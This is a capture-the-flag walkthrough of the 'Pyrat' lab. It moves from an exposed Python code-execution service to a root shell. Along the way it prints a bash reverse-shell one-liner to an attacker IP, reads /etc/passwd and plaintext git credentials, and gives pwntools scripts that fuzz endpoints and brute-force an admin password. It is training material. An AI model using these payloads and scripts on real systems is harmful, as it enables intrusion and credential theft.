# Pyrat Walkthrough

## Lab Description:
Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Gaining Initial Access:

### Information Gathering:
Let's begin our information gathering by doing an `nmap` scan:
```
sudo nmap -sV -sC -v <target_ip>
```
> `-sV` does a scan to id the version of the services running on the machine, so the scan might take a few minutes.  

We get the following output from the nmap scan:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=11/8%Time=690F72F6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> Output from nmap scan

There are two services externally open on the machine:
- ssh running on port 22
- a ==simple python http server== running on port 8000

### Further Enumerating Service:

Let's attempt to interact with the http server, we can either use the browser or `curl`:

```
curl http://<target_ip>:8000/
```

We get the following output:
```
Try a more basic connection! 
```

The messages tells us that we need to try to connect in a more basic way. Let's use `nc` to interact with the server:

```
nc <target-ip> 8000
```

We were able to connect to the server but nothing appears.
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
```
Let's attempt to interact with the server:

```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
```
We have recieved an error, since this is a simple python server we should try a python command:

```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!
``` 

We discovered that we can run python commands on the machine by interacting with the http server!

### Exploiting the Simple Python Server:

Let's gain a reverse shell using the http server and some simple python commands:
1. Import the `os` library to our python environment, this will give us access to functions that can send commands to the operating system:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os
```
2. Now we can send commands to the OS using the `os.system()` function, but first we need to know what type of OS is running so we can send the right commands. We figure that out using the `os.name` command:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os

print(os.name)
```
We get the following output:
```
posix
```
Which means that this is a unix system, so it probably a flavor o linux. We can use a simple bash one-liner payload to start a reverse shell connection like: `bash -c 'exec bash -i &>/dev/tcp/<hackers-ip>/<hacker-port> <&1'`
3. Before we run the payload on the target machine lets open a port on our machine to recieve the reverse shell:
```
$ nc -nvlp 4444
listening on [any] 4444 ...
```
4. Finally let's run the payload on the target machine's http server:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os

print(os.name)
posix

os.system("bash -c 'exec bash -i &>/dev/tcp/10.6.46.187/4444 <&1 '")

```
5. Now if we check our `nc` listener we should have received a connection:
```
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.6.46.187] from (UNKNOWN) [10.201.37.125] 39768
bash: cannot set terminal process group (719): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@ip-10-201-37-125:~$
```
We are in the system!

## Escalating Privileges

### Information Gathering:

Now that we have a foothold in the system we need to collect more information and attempt to gain larger control

```
whoami
```
 
```
pwd
```

```
ls
```

With the last few commands we can notice that we are not the root user but the `web-data` user -- a user made just to manage the web service. And we are unable to list de files in the root directory. So let's try to see other parts of the system.

```
cat /etc/passwd
```

In the output we can find two normal users:
```
think:x:1000:1000:,,,:/home/think:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

Now let's search in some common and important directories for information:

```
ls /var
```

```
ls /var/mail
```

```
cat /var/mail/think
```

```
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

We found great information, we learned two names that we can use later if need be. Furthermore, we learned about a possible github repository on the machine now we just have to try and find it.

`find / -type d -name .git 2>/dev/null`

after searching the directories for a bit we found:
```
/opt/dev/.git
```

lets search through the files the .git directory

```
cat /opt/dev/.git/config
```

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```

Perfect we found a cred, let's try to use SSH to connect to the machine using the credentials we found:

```
$ ssh think@10.201.91.95
The authenticity of host '10.201.91.95 (10.201.91.95)' can't be established.
ED25519 key fingerprint is: SHA256:0CmSnPkHnrtapj8/yHP0C2kzMYRrTLEtx2jBL8vbrmA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.91.95' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
think@10.201.91.95's password:
```

perfect now let's continue to investigate the git repo we found

```
cd /opt/dev/
```

```
git status
```

```
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```

```
git log
```

```
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
```

```
git show 0a3c36d66369fd4b07ddca72e5379461a63470bf 
```

this shows us a older version of the server:
```
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```

Analyzing the script we can see that if the application receives the right data it will call a function called `get_this_endpoint()` but if not it will give us a low privilege shell.

Let's attempt to pass to the http server the data 'some_endpoint' to check if that endpoint still exists:

```
$ nc -nv 10.201.91.95 8000
(UNKNOWN) [10.201.91.95] 8000 (?) open
some_endpoint
name 'some_endpoint' is not defined
```

It appears that the endpoint doesn't exist anymore since it's from the old version of the application, so let's try to fuzz for more endpoints that might exist. We can do this by writing a quick bash or python script. Below is some bash code that can do the trick:

```bash
#!/bin/python3

from pwn import *

file = 'filtered_endpoints.txt'
host = '10.201.122.226'
port = 8000

# global: only show errors
context.log_level = 'error'

def connect_to_server():
    return remote(host,port)

with open(file, "r", encoding="latin-1") as f:
    for endpoint in f:
        connection = connect_to_server()

        endpoint = endpoint.strip()

        connection.sendline(endpoint.encode())

        response = connection.recvline().decode().strip()

        if (response != f"name '{endpoint}' is not defined" and response != "invalid syntax (<string>, line 1)" and response != ""):
            print(f"[+] Found Endpoint: {endpoint}")
        connection.close()
```
I used the common.txt wordlist from /usr/share/dirb/wordlists/common.txt, but because of the python syntax we need to remove endpoints in the wordlist that starts with following characters ".,~,_,/,[0-9]". We can easily do this the the `awk` command:

```
awk '!/-|_|@|\.|~|^[0-9]/' common.txt > filtered_endpoints.txt
```

now we can run the script:
```
python3 fuzz_endpoints.py
```
It takes awhile since the wordlist is large, but we get the following endpoints:
```
[+] Found Endpoint: admin
[+] Found Endpoint: shell 
```

The `admin` endpoint looks promising by connecting to it we see that it asks for a password:
```
nc -nv 10.201.122.226 8000
(UNKNOWN) [10.201.122.226] 8000 (?) open
admin
Password:
```

We can a script to bruteforce passwords for the login prompt :

```
#!/bin/python3

from pwn import *

# global: only show errors
context.log_level = 'error'

file = '/usr/share/wordlists/rockyou.txt'
host = '10.201.122.226'
port = 8000

def connect_to_service():
    return remote(host, port)

def attempt_password(password):
    connection = connect_to_service()
    connection.sendline(b"admin")
    connection.recvuntil(b"Password:")
    connection.sendline(password.encode())

    response = connection.recvline(timeout=2)
    response = connection.recvline(timeout=2)

    if b"Password:" in response:
        print(f"Password: {password} failed")
        connection.close()
        return False
    else:
        print(f"Password: {password} might have worked!")
        connection.close()
        return True


def fuzz_passwords():
    with open(file, "r", encoding="latin-1") as f:
        for password in f:
            password = password.strip()
            if attempt_password(password):
                print(f"Found a password: {password}")
                break

fuzz_passwords()
```
We found the password! And gained access to a root shell!
